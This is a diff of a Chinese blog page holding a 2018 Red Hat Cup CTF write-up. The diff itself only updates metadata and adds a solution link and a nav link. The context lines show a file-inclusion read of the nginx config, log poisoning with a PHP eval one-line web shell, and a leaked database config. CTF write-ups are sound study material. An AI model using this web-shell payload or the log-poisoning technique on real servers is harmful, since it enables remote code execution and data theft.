@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="K4ng&#39;s blog">
 <meta property="og:description" content="对于这次红帽杯的题目。。是真的很想吐槽啊。。 0X01 Not Only Wiresharkwireshark打开数据包，右键追踪TCP流，可发现从第15流开始，HTTP请求的路径和参数变为/sqli/example2.php?name=123。写了个脚本正则按顺序抓下来所有name参数的值。 1234567891011121314import ref = open(&quot;Not Only Wires">
 <meta property="og:image" content="https://i.imgur.com/wh9sn7C.png">
-<meta property="og:updated_time" content="2018-05-01T16:05:58.000Z">
+<meta property="og:updated_time" content="2018-05-06T06:01:03.831Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="红帽杯2018_Writeup">
 <meta name="twitter:description" content="对于这次红帽杯的题目。。是真的很想吐槽啊。。 0X01 Not Only Wiresharkwireshark打开数据包，右键追踪TCP流，可发现从第15流开始，HTTP请求的路径和参数变为/sqli/example2.php?name=123。写了个脚本正则按顺序抓下来所有name参数的值。 1234567891011121314import ref = open(&quot;Not Only Wires">
@@ -232,12 +232,13 @@
 <li>提示<code>Site is tmvb.com</code>，玩了老半天，google了一波，whois查询了一波，爆破了子域名，Host也试着改成了<code>Host: tmvb.com</code>。后来才发现要加上<code>www</code>，excuse me??</li>
 <li>改Referer很正常。</li>
 <li>提示<code>Japan sales only</code>，试了改了<code>Accept-Language: ja;q=0.9</code>，也试过了XFF头为日本IP。都不行！！后来队友突然可以了，才发现要XFF头和language同时改！并且<code>q=0.9</code>要删去！excuse me??</li>
-<li>终于有正常页面了，要干嘛？订单号加验证码的爆破???</li>
+<li>终于有正常页面了。emm..爆破??</li>
 </ol>
 <p>告辞！</p>
 <h2 id="0x04-biubiubiu"><a href="#0x04-biubiubiu" class="headerlink" title="0x04 biubiubiu"></a>0x04 biubiubiu</h2><p>进去就是一波文件包含！试了下<code>php://filter</code>不管用，猜测应该是被过滤了。提示了<code>users.sql</code>感觉没是用。<br>然后就读了一波配置文件<code>?page=/etc/nginx/nginx.conf</code>爽歪歪。</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">##</span></div><div class="line"><span class="comment"># Logging Settings</span></div><div class="line"><span class="comment">##</span></div><div class="line"></div><div class="line"><span class="attribute">access_log</span> /var/log/nginx/access.log;</div><div class="line"><span class="attribute">error_log</span> /var/log/nginx/error.log;</div></pre></td></tr></table></figure>
 <p>看到了日志文件路径就想到了包含日志文件写入php代码。反手一个php一句话<code>?page=&lt;?php @eval($_POST[&#39;key&#39;]);?&gt;</code>，下一步就是菜刀了。<br>看到了数据库的帐号密码，flag就在数据库里了。<br><figure class="highlight php"><figcaption><span>conn.php</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$db_host = <span class="string">'mysql'</span>;</div><div class="line">$db_name = <span class="string">'user_admin'</span>;</div><div class="line">$db_user = <span class="string">'Dog'</span>;</div><div class="line">$db_pwd = <span class="string">''</span>;</div><div class="line"></div><div class="line">$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$conn)&#123;</div><div class="line">    <span class="keyword">die</span>(mysqli_connect_error());</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>挂下预期解：<a href="https://www.jianshu.com/p/6747fbc7b289?utm_campaign=hugo&amp;utm_medium=reader_share&amp;utm_content=note&amp;utm_source=qq" target="_blank" rel="external">《记一次利用gopher的内网mysql盲注》</a></p>
 
       
 
@@ -320,6 +321,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2018/05/06/test/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          asdssad
+        
+      </div>
+    </a>
   
   
     <a href="/2018/04/25/starctf2018-SimpleWeb-wp/" id="article-nav-older" class="article-nav-link-wrap">
